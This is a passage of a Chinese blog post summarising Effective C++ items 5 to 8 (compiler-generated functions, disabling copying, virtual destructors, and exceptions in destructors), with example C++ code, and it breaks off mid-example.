将全局变量变为本地静态变量<br>使用一个函数，只用来定义一个本地静态变量并返回它的引用。因为C++规定在本地范围(函数范围)内定义某静态对象时，当此函数被调用，该静态变量一定会被初始化。<pre class="language-c" data-language="c"><code class="language-c">class Server<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Server<span class="token operator">&amp;</span> <span class="token function">server</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                         <span class="token comment">//将直接的声明改为一个函数</span>    <span class="token keyword">static</span> Server server<span class="token punctuation">;</span>    <span class="token keyword">return</span> server<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>class Client<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Client<span class="token operator">::</span><span class="token function">client</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        <span class="token comment">//客户端构造函数通过函数访问服务器数据</span>    number <span class="token operator">=</span> <span class="token function">server</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>number<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>Client<span class="token operator">&amp;</span> <span class="token function">client</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        <span class="token comment">//同样将客户端的声明改为一个函数</span>    <span class="token keyword">static</span> Client client<span class="token punctuation">;</span>    <span class="token keyword">return</span> client<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>总结：</li><li>对于自由类型，要保证在定义时手动初始化</li><li>在定义构造函数时，要用初始化列表，避免使用在函数体内的赋值初始化。在使用初始化列表时，为了保持代码一致性，初始化列表中变量的顺序要与其声明顺序相同</li><li>当不同的编译单元产生互动时，要将其中非本地的静态变量变为本地的静态变量才能保证安全的读写</li></ul><h1 id="构造、析构、赋值运算"><a href="#构造、析构、赋值运算" class="headerlink" title="构造、析构、赋值运算"></a>构造、析构、赋值运算</h1><h2 id="条款5-了解C-默默编写并调用哪些函数"><a href="#条款5-了解C-默默编写并调用哪些函数" class="headerlink" title="条款5 了解C++默默编写并调用哪些函数"></a>条款5 了解C++默默编写并调用哪些函数</h2><ol><li>C++会为类生成默认的关键函数，如默认的构造函数，拷贝赋值运算符，拷贝构造函数以及析构函数<pre class="language-c" data-language="c"><code class="language-c">class Empty <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>             <span class="token comment">//假定以下功能都会被调用，此定义等价于：</span>class Empty<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    <span class="token function">Empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span>                                <span class="token comment">//构造函数</span>    <span class="token function">Empty</span><span class="token punctuation">(</span><span class="token keyword">const</span> Empty<span class="token operator">&amp;</span> empty<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span>             <span class="token comment">//拷贝构造函数</span>    <span class="token operator">~</span><span class="token function">Empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span>                               <span class="token comment">//析构函数</span>    Empty<span class="token operator">&amp;</span> operator<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">const</span> Empty<span class="token operator">&amp;</span> empty<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span>   <span class="token comment">//拷贝赋值运算符</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>对于赋值运算符，只有当代码合法且有意义，编译器才会自动生成，然而有些时候会产生错误。<pre class="language-c" data-language="c"><code class="language-c">template<span class="token operator">&lt;</span>typename T<span class="token operator">></span>class A<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    <span class="token function">A</span><span class="token punctuation">(</span>std<span class="token operator">::</span>string<span class="token operator">&amp;</span> _name<span class="token punctuation">,</span> <span class="token keyword">const</span> T<span class="token operator">&amp;</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>  private<span class="token operator">:</span>    std<span class="token operator">::</span>string<span class="token operator">&amp;</span> name<span class="token punctuation">;</span>    <span class="token keyword">const</span> T value<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>std<span class="token operator">::</span>string <span class="token function">s1</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>std<span class="token operator">::</span>string <span class="token function">s2</span><span class="token punctuation">(</span><span class="token string">"hi"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>A<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">a1</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>A<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">a2</span><span class="token punctuation">(</span>s2<span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>a1<span class="token operator">=</span>a2<span class="token punctuation">;</span></code></pre>如果按照默认的赋值运算符，会编译错误，相当于如下操作，自然不可使用。<pre class="language-c" data-language="c"><code class="language-c">string u <span class="token punctuation">,</span> v<span class="token punctuation">;</span>string <span class="token operator">&amp;</span>a <span class="token operator">=</span> u <span class="token punctuation">,</span><span class="token operator">&amp;</span>b <span class="token operator">=</span> v<span class="token punctuation">;</span>a <span class="token operator">=</span> b<span class="token punctuation">;</span></code></pre>此外，当基类有将赋值运算符声明为私有时，编译器也会拒绝为它的子类生成赋值运算符，因为在子类赋值过程中，它所包含的基类也应当被赋值。但是既然被声明为基类的私有成员，子类将不能调用。</li></ol><p>总结：</p><ul><li>如果自己不声明，编译器将会自动生成默认的构造函数，拷贝构造函数，拷贝赋值运算符和析构函数。</li></ul><h2 id="条款6-明确拒绝不需要的自动生成函数"><a href="#条款6-明确拒绝不需要的自动生成函数" class="headerlink" title="条款6 明确拒绝不需要的自动生成函数"></a>条款6 明确拒绝不需要的自动生成函数</h2><p>考虑如下类：<br><pre class="language-c" data-language="c"><code class="language-c">class Widget <span class="token punctuation">&#123;</span> public<span class="token operator">:</span>    <span class="token function">Widget</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token operator">::</span>string <span class="token operator">&amp;</span>name<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">name_</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">buf_</span><span class="token punctuation">(</span>new <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token operator">~</span><span class="token function">Widget</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> delete buf_<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> private<span class="token operator">:</span>    std<span class="token operator">::</span>string name_<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>buf_<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><br>默认生成的拷贝构造函数，会直接拷贝buf_的值，导致两个Widget对象指向同一个缓 冲区，这会导致析构的时候两次删除同一片区域的问题（这个问题又叫双杀问题），所以在某种情况下就需要禁止拷贝。</p><p>当一个父类将拷贝函数声明为私有时，编译器会拒绝为它的子类生成拷贝函数。因此可以专门使用一个父类，在其中声明拷贝操作为私有，并让可以的类继承自它。<br><pre class="language-c" data-language="c"><code class="language-c">class Uncopyable<span class="token punctuation">&#123;</span>  protected<span class="token operator">:</span>    <span class="token function">Uncopyable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">~</span><span class="token function">Uncopyable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  private<span class="token operator">:</span>    <span class="token function">Uncopyable</span><span class="token punctuation">(</span><span class="token keyword">const</span> Uncopyable<span class="token operator">&amp;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment">//将拷贝函数转移至此</span>    Uncopyable<span class="token operator">&amp;</span> operator<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">const</span> Uncopyable<span class="token operator">&amp;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class House<span class="token operator">:</span>public Uncopyable<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>              <span class="token comment">//公有继承</span></code></pre><br>在c++11中，可以在函数列表后加上=delete防止拷贝。<br><pre class="language-c" data-language="c"><code class="language-c">class Base<span class="token punctuation">&#123;</span>public<span class="token operator">:</span><span class="token function">Base</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>private<span class="token operator">:</span><span class="token function">Base</span><span class="token punctuation">(</span>Base<span class="token operator">&amp;</span><span class="token punctuation">)</span><span class="token operator">=</span>delete<span class="token punctuation">;</span>Base<span class="token operator">&amp;</span> operator<span class="token operator">=</span><span class="token punctuation">(</span>Base<span class="token operator">&amp;</span><span class="token punctuation">)</span><span class="token operator">=</span>delete<span class="token punctuation">;</span>friend <span class="token keyword">void</span> <span class="token function">friendfunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><br>总结:</p><ul><li>当不想让编译器为类自动生成某些函数时，把这些不想要的函数声明在此类的私有成员中，或者更好使用像如上例子的一个父类，并让可以的类公有继承。</li></ul><h2 id="条款7-为多态基类生成virtual析构函数"><a href="#条款7-为多态基类生成virtual析构函数" class="headerlink" title="条款7 为多态基类生成virtual析构函数"></a>条款7 为多态基类生成virtual析构函数</h2><p>对于多态基类，考虑如下情况：<br><pre class="language-c" data-language="c"><code class="language-c">class TimeKeeper                              <span class="token comment">//计时器类，用来当做基类</span><span class="token punctuation">&#123;</span>                                public<span class="token operator">:</span>    <span class="token function">TimeKeeper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                              <span class="token comment">//这是构造函数</span>    <span class="token operator">~</span><span class="token function">TimeKeeper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                             <span class="token comment">//这是析构函数</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class AtomicClock <span class="token operator">:</span> public TimeKeeper<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>   <span class="token comment">//原子钟是一种计时器</span>class WaterClock <span class="token operator">:</span> public TimeKeeper<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token comment">//水钟也是一种计时器</span>TimeKeeper<span class="token operator">*</span> <span class="token function">getTimeKeeper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span>              <span class="token comment">//用来返回一个动态分配的基类对象</span>TimeKeeper<span class="token operator">*</span> ptk <span class="token operator">=</span> <span class="token function">getTimeKeeper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                                         <span class="token comment">//使用这个指针操作它的子类</span>delete ptk<span class="token punctuation">;</span>                                   <span class="token comment">//使用完毕，释放资源</span></code></pre><br>C++中的new与delete常会导致内存泄漏。<br>如上代码问题在于，当你通过基类指针使用子类，使用完毕后却只从基类删除。同时这个基类的析构函数并不是虚函数(virtual)，也就是不允许子类有自己版本的析构函数，这样就只能删除子类中基类的部分，而子类衍生出来的变量和函数所占用的资源并没有被释放，这就造成了这个对象只被释放了一部分资源的现象，依然会导致内存泄漏。</p><p>解决办法：<br>给基类一个虚的析构函数，这样子类就允许拥有自己的析构函数，就能保证被占用的所有资源都会被释放。<br><pre class="language-c" data-language="c"><code class="language-c">class TimeKeeper<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    virtual <span class="token operator">~</span><span class="token function">TimeKeeper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><br>但是！如果不用来当做基类，随便把它的析构函数声明为虚函数不是不必要，而是不好！</p><p>虚函数是用来在运行时(runtime)，自动把编译时未知的对象，比如用户输入的对象，和它所对应的函数绑定起来并调用。当一个类包含虚函数时，编译器会给这个类添加一个隐藏变量，即虚函数表指针(virtual table pointer)，用来指向一个包含函数指针的数组，即虚函数表(virtual table)。当一个虚函数被调用时，具体调用哪个函数就可以从这个表里找了。<br>问题在于，这个变量也是要占空间的！例如在32位系统里，一个地址占32位，那么这个变量就要占32位，而在64位系统就要占用64位。再举个栗子:<br><pre class="language-c" data-language="c"><code class="language-c">class Point<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    <span class="token function">Point</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">~</span><span class="token function">Point</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  private<span class="token operator">:</span>    <span class="token keyword">int</span> x<span class="token punctuation">;</span>    <span class="token keyword">int</span> y<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><br>这样一个Point的类包含两个整型，因此一个对象要占64位。但如果把析构函数声明为虚函数，在32位系统里就要多占32位，在64位系统里就要多占64位，那么它所占用的空间直接增大了50%到100%。这样一来，对象就刚好不能用一个64位的寄存器装下了。</p><p>对于标准库中的类不能随便继承，包括STL，因为这些库的并没有把析构函数定义为虚函数。<br><pre class="language-c" data-language="c"><code class="language-c">class SpecialString <span class="token operator">:</span> public std<span class="token operator">::</span>string<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      <span class="token comment">//某个继承自标准字符串的类</span>SpecialString<span class="token operator">*</span> pss <span class="token operator">=</span> new <span class="token function">SpecialString</span><span class="token punctuation">(</span><span class="token string">"Hi"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>std<span class="token operator">::</span>string<span class="token operator">*</span> ps<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>ps <span class="token operator">=</span> pss<span class="token punctuation">;</span>delete ps<span class="token punctuation">;</span>                                          <span class="token comment">//使用完后从基类删除内存</span></code></pre><br>如上代码会导致一开始所说的内存泄露问题。</p><p>对于抽象类(abstract class)，抽象类是包含至少一个纯虚函数的类(pure virtual function)，而且它们不能被实例化，只能通过指针来操作，是纯粹被用来当做多态的基类的。</p><p>相比于具体类(concrete class)，虽然它们都可以通过父类指针来操作子类，但抽象类有更高一层的抽象，从设计的角度上能更好概括某些类的共同特性，比如”狗”相对于”边牧”，”柴犬”，”斗牛”，把”狗”当做基类显然要好过把某个品种当做基类。</p><p>因为多态的基类需要有虚析构函数，抽象类又需要有纯虚函数，那么在抽象类中就要把析构函数声明为纯虚函数:<br><pre class="language-c" data-language="c"><code class="language-c">class VBase<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    virtual <span class="token operator">~</span><span class="token function">VBase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>              <span class="token comment">//"=0"只是一个关键字，用来声明纯虚函数，并不把任何东西设为0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><br>同时注意，当在继承层级中某一类的析构函数被调用时，它下一级类的析构函数会被随后调用，最后一直到基类的析构函数，因此作为析构函数调用的终点，要保证有一个定义，否则链接器会报错。</p><p>一般来讲，可以使用基类都是为了实现多态，那么这些基类就需要虚的析构函数，比如可以的TimeKeeper类，就可以通过TimeKeeper的指针来操作例如AtomicClock这样的子类。但并不是所有的基类都是被用来实现多态的，比如可以在上一章讲过的Uncopyable类，单纯只是为了实现某个功能，而不是希望通过它的指针来操作某个对象，那么就不需要将析构函数声明为虚函数。以及某些类就不是用来当做基类的，比如标准库的string类和STL容器类，也不需要将析构函数声明为虚函数。</p><p>总结：</p><ul><li>用来实现多态的基类应该有声明为虚(virtual)的析构函数。如果一个基类中含有虚函数，那它就是被用来实现多态的，就需要有一个虚的析构函数</li><li>某些类不是被用来当做基类的，比如std::string和STL，或者某些不是用来实现多态的基类，比如上一章的Uncopyable，就不需要虚的析构函数。</li></ul><h2 id="条款8-别在析构函数中抛出异常"><a href="#条款8-别在析构函数中抛出异常" class="headerlink" title="条款8 别在析构函数中抛出异常"></a>条款8 别在析构函数中抛出异常</h2><p>先讲一下什么叫栈展开(stack unwinding)，才能更好理解C++异常(exception)的机制：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token function">throw</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token comment">//函数f1会抛出一个整型的异常代码</span>  cout<span class="token operator">&lt;&lt;</span><span class="token string">"f1 starts"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>                       <span class="token comment">//这个变量会在栈展开的过程中被释放资源</span>  throw <span class="token number">100</span><span class="token punctuation">;</span>                   <span class="token comment">//抛出异常，程序开始在栈中搜索对应的异常处理器，即开始栈展开</span>  cout<span class="token operator">&lt;&lt;</span><span class="token string">"f1 ends"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>       <span class="token comment">//这行代码不会被执行</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> f2 <span class="token function">throw</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">//函数f2调用了f1，所以抛出异常的类型也是整型</span>  cout<span class="token operator">&lt;&lt;</span><span class="token string">"f2 starts"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span>                      <span class="token comment">//这个变量也会在栈展开的过程中被释放资源</span>  <span class="token function">f1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token comment">//f1没有搜索到对应的异常处理，因此返回到f2搜索</span>  cout<span class="token operator">&lt;&lt;</span><span class="token string">"f2 ends"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>      <span class="token comment">//这行代码也不会被执行</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">f3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  cout<span class="token operator">&lt;&lt;</span><span class="token string">"f3 starts"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>  try<span class="token punctuation">&#123;</span>                        <span class="token comment">//函数f3在try里调用f2，并可能会catch一个整型的异常</span>    <span class="token function">f2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>              <span class="token comment">//f2也没有找到异常处理，最后返回了f3并找到了异常处理</span>    cout<span class="token operator">&lt;&lt;</span><span class="token string">"exception "</span><span class="token operator">&lt;&lt;</span>i<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  cout<span class="token operator">&lt;&lt;</span><span class="token string">"f3 ends"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">f3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>在C++里，当有异常被抛出，调用栈(call stack)，即栈中用来储存函数调用信息的部分，会被按次序搜索，直到找到对应类型的处理程序(exception handler)。而这里的搜索顺序就是f1-&gt;f2-&gt;f3。f1没有对应类型的catch块，因此跳到了f2，但f2也没有对应类型的catch块，因此跳到f3才能处理掉这个异常。</p><p>以上这个寻找异常相应类型处理器的过程就叫做栈展开。同时在这一过程中，当从f1返回到f2时，f1里局部变量的资源会被清空，即调用了对象的析构函数。同样，在从f2返回到f3时，f2里局部变量也会被调用析构函数并清空资源。</p><p>C++并不阻止在类的析构函数中抛出异常，但这是一个非常不好的做法。因为栈展开的前提是已经有一个未处理的异常，并且栈展开会自动调用函数本地对象的析构函数，如果这时对象的析构函数时又抛出一个异常，现在就同时有两个异常出现，但C++最多只能同时处理一个异常，因此程序这时会自动调用std::terminate()函数，导致可以所谓的闪退或者崩溃。</p><p>如下栗子也会导致程序同时出现多个异常：<br><pre class="language-c" data-language="c"><code class="language-c">class Widget<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token operator">~</span><span class="token function">Widget</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span>        <span class="token comment">//假设此析构函数可能会抛出异常</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span>Widget<span class="token operator">></span> v<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>                         <span class="token comment">//在这一行调用了v的析构函数，资源被释放</span></code></pre><br>当v被调用析构函数，它包含的所有Widget对象也都会被调用析构函数。又因为v是一个容器，如果在释放第一个元素时触发了异常，它也只能继续释放别的元素，否则会导致其它元素的资源泄露。如果在释放第二个元素的时候又触发了异常，那么程序同样会导致崩溃。不仅仅是std::vector，所有STL容器的类甚至包括数组也都会像这样因为析构函数抛出异常而崩溃程序，所以在C++中，不要让析构函数抛出异常！</p><p>如果不得不抛出异常呢，如下：<br><pre class="language-c" data-language="c"><code class="language-c">class DBConnection<span class="token punctuation">&#123;</span>                   <span class="token comment">//某用来建立数据库连接的类</span>  public<span class="token operator">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">static</span> DBConnection <span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//建立一个连接</span>    <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment">//关闭一个连接，假设可以抛出异常</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class DBConn<span class="token punctuation">&#123;</span>                         <span class="token comment">//创建一个资源管理类来提供更好的用户接口</span>  public<span class="token operator">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token operator">~</span>DBConn<span class="token punctuation">&#123;</span> db<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">]</span>            <span class="token comment">//终止时自动调用关闭连接的方法</span>  private<span class="token operator">:</span>    DBConnection db<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#123;</span>                                   DBConn <span class="token function">dbc</span><span class="token punctuation">(</span>DBConnection<span class="token operator">::</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//创建一个DBConn类的对象</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                                <span class="token punctuation">&#125;</span>      <span class="token comment">//对象dbc被释放资源</span><span class="token comment">//但它的析构函数调用了可能会抛出异常的close()方法</span></code></pre><br>可以通过DBConn的析构函数来释放资源并关闭连接，但析构函数所调用的close()方法可能会抛出异常，那么有什么方法来解决呢？<br>有三个方法：</p><ul><li><p>栈展开的过程终止于异常被对应类型的catch块接到，因此在这种情况下，只要catch包括了所有可能的异常，析构函数就能消化掉这个异常，防止异常从析构函数里跑出来，和别的异常产生冲突。</p><pre class="language-c" data-language="c"><code class="language-c">DBConn<span class="token operator">::</span><span class="token operator">~</span><span class="token function">DBConn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  try<span class="token punctuation">&#123;</span>     db<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//记录访问历史</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>通过std::abort()函数来主动关闭程序，而不是任由程序在某个随机时刻突然崩溃，这样能减少潜在的用户风险。对于某些比较严重的异常，就可以使用这个方法。并且可以结合使用上面的方法，把能处理的异常消化掉。</p><pre class="language-c" data-language="c"><code class="language-c">DBConn<span class="token operator">::</span><span class="token operator">~</span><span class="token function">DBConn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  try<span class="token punctuation">&#123;</span>     db<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//记录访问历史</span>    std<span class="token operator">::</span><span class="token function">abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>把可能抛出异常的代码移出析构函数，设计DBConn类的更安全的接口，让其他函数来承担这个风险，而且这样也可以事先在析构函数这样的紧要关头前对异常做出处理。</p><pre class="language-c" data-language="c"><code class="language-c">class DBConn<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token operator">~</span><span class="token function">DBConn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//当要关闭连接时，手动调用此函数</span>  private<span class="token operator">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    closed <span class="token operator">=</span> true<span class="token punctuation">;</span>       <span class="token comment">//显示连接是否被手动关闭</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> DBConn<span class="token operator">::</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//当需要关闭连接，手动调用此函数</span>  db<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  closed <span class="token operator">=</span> true<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>DBConn<span class="token operator">::</span><span class="token operator">~</span><span class="token function">DBcon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>closed<span class="token punctuation">)</span>            <span class="token comment">//析构函数虽然还是要留有备用，但不用每次都承担风险了</span>    try<span class="token punctuation">&#123;</span>      db<span class="token punctuation">.</span><span class="token function">close</span><span class="token 